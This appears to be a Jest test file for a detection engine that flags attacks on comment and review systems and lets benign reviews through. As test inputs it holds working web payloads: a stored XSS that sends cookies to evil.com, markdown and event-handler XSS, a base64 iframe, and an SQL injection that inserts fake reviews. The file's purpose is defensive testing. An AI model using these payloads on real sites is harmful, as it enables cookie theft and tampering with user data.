'use strict';
const { DetectionEngine } = require('../../src/index');

describe('Scenario: Comment and Review System Attacks', () => {
  let engine;
  beforeEach(() => {
    engine = new DetectionEngine();
  });

  const runPayload = (payload) => engine.detect(payload);

  it('detects Stored XSS cookie theft', () => {
    const result = runPayload("Great product! <script>document.write('<img src=http://evil.com/steal?c='+document.cookie+'>')</script>");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects Markdown link injection', () => {
    const result = runPayload("[Click here](javascript:alert(1))");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects Markdown image injection', () => {
    const result = runPayload('![img](http://evil.com/tracking.gif "onerror=alert(1)")');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects HTML5 element XSS', () => {
    const result = runPayload("<details/open/ontoggle=confirm(1)>test</details>");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects XSS in display name', () => {
    const result = runPayload("<b onmouseover=alert(1)>Reviewer</b>");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects SQLi to fake reviews', () => {
    const result = runPayload("'; INSERT INTO reviews (rating) VALUES (5);--");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects Base64-encoded iframe XSS', () => {
    const result = runPayload('<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('allows benign review', () => {
    const result = runPayload("This is a great product, 5 stars!");
    expect(result.label).toBe('benign');
  });

  it('allows benign negative review', () => {
    const result = runPayload("I don't recommend this -- arrived broken.");
    expect(result.label).toBe('benign');
  });

  it('allows benign with quotes/special chars', () => {
    const result = runPayload("Size M fits well. I'm 5'10\" and 170lbs.");
    expect(result.label).toBe('benign');
  });
});
